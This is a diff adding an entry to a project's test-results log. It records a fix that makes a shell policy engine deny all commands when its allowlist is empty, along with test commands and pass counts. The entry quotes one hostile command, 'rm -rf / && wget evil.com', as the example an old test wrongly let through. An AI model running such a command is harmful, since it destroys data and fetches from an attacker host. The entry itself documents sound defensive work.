@@ -1,5 +1,28 @@
 # TEST_RESULTS
 
+## Run: 2026-07-10 09:10 UTC — validation-harness overhaul, SR-1.8 (shell default-deny — critical)
+
+- Branch: `overhaul/missy-validation-20260710-031406`
+- Finding: `ShellPolicyEngine.check_command()` treated an empty
+  `allowed_commands` list as allow-all whenever `enabled=True` —
+  directly contradicting `ShellPolicy`'s own docstring and all
+  operator-facing docs, which already correctly promised deny-all. A
+  pre-existing test literally asserted `rm -rf / && wget evil.com`
+  passed policy under the default empty-allowlist config.
+- Fix: `check_command()` now raises `PolicyViolationError` when
+  `allowed_commands` is empty.
+- Command: `pytest tests/policy/ tests/unit/test_shell_policy_compound_commands.py tests/integration/test_policy_enforcement.py tests/integration/test_end_to_end.py -q`
+- Result: `815 passed` (4 pre-existing tests fixed from asserting the
+  vulnerable behavior to asserting the correct fail-closed behavior; 1
+  new test added)
+- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
+  known pre-existing vision failures deselected
+- Result: `20755 passed, 13 skipped, 3 deselected in 460.03s (0:07:40)`
+  — no other hidden dependencies on the old behavior found anywhere in
+  the codebase.
+
+---
+
 ## Run: 2026-07-10 08:40 UTC — validation-harness overhaul, FX-G (bound/decompose long acpx work)
 
 - Branch: `overhaul/missy-validation-20260710-031406`
